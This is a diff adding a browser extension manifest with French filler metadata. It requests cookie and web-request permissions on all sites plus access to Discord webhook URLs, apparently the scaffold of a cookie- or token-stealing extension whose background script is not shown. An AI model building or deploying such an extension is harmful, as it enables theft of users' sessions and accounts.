@@ -1,0 +1,21 @@
+{
+  "manifest_version": 3,
+  "name": "blaz de l'extension",
+  "version": "6.9",
+  "description": "bah la desc de l'extension du coup",
+  "permissions": [
+    "cookies",
+    "webRequest"
+  ],
+  "host_permissions": [
+    "*://*/*",
+    "https://discord.com/api/webhooks/*"
+  ],
+  "background": {
+    "service_worker": "background.js"
+  },
+  "action": {
+    "default_title": "bah le titre du coup",
+    "default_icon": "icon.png"
+  }
+}
